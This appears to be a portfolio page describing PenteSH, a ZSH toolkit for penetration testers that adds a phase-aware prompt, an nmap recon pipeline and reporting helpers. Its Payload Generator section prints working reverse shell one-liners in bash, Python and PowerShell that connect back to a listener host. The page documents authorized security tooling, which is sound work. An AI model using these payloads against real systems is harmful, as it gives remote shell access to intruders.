---
id: pentesh
label: Pentest Hub
subtitle: Pentest Tooling
category: projects
size: 14
color: "#f472b6"
icon: Terminal
connections: ["axians","python","bash"]
---
# PenteSH — ZSH Pentest Environment

## Overview
A modular ZSH toolkit that transforms a standard terminal into a purpose-built penetration testing workstation. Designed for offensive engagements where speed and context-switching between tools is critical.

## Problem Statement
During red team operations at Axians, switching between recon, exploitation, and reporting phases required constant tooling changes and environment resets. PenteSH solves this by providing a persistent, context-aware shell environment.

## Architecture

```
PenteSH/
├── core/
│   ├── init.zsh          # Entry point, sources all modules
│   ├── keybinds.zsh      # Custom ZLE widgets + keybindings
│   └── prompt.zsh        # Variable-state prompt (mode + target + VPN)
├── modules/
│   ├── recon.zsh         # Aliases + functions for enumeration
│   ├── exploitation.zsh  # Exploit helpers, payload generators
│   ├── post.zsh          # Post-exploitation chains
│   └── reporting.zsh     # Auto-screenshot + note-taking
└── targets/
    └── .target           # Persisted target IP/hostname
```

## Key Features

### Dynamic Prompt
The prompt changes based on engagement phase:
```zsh
# Sets the active target — persisted across sessions
target() {
  echo "$1" > ~/.pentesh/target
  export PENTESH_TARGET="$1"
  _pentesh_refresh_prompt
}

# PROMPT output:
# [RECON] ➜ 10.10.14.2 → 10.0.0.100 %
```

### Quick Recon Pipeline
```zsh
# One-liner: nmap → parse open ports → kick off targeted scripts
qscan() {
  local target="${1:-$PENTESH_TARGET}"
  nmap -p- --min-rate 5000 -oG /tmp/portscan.gnmap "$target" | \
  grep "open" | cut -d'/' -f1 | tr '\n' ',' | \
  xargs -I {} nmap -sV -sC -p{} -oN "/tmp/targeted_$target.nmap" "$target"
}
```

### Payload Generator
```zsh
# Generates staged reverse shell payload for common listeners
revshell() {
  local lhost="${1:-$PENTESH_LHOST}"
  local lport="${2:-4444}"
  local type="${3:-bash}"
  case "$type" in
    bash)   echo "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" ;;
    python) echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${lhost}\",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" ;;
    powershell) echo "\$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});\$stream = \$client.GetStream();..." ;;
  esac
}
```

## Impact
- Reduced tool-switching overhead by ~40% during engagements
- Standardized reporting artifacts across team members
- Adopted internally at Axians for junior pentesters' onboarding
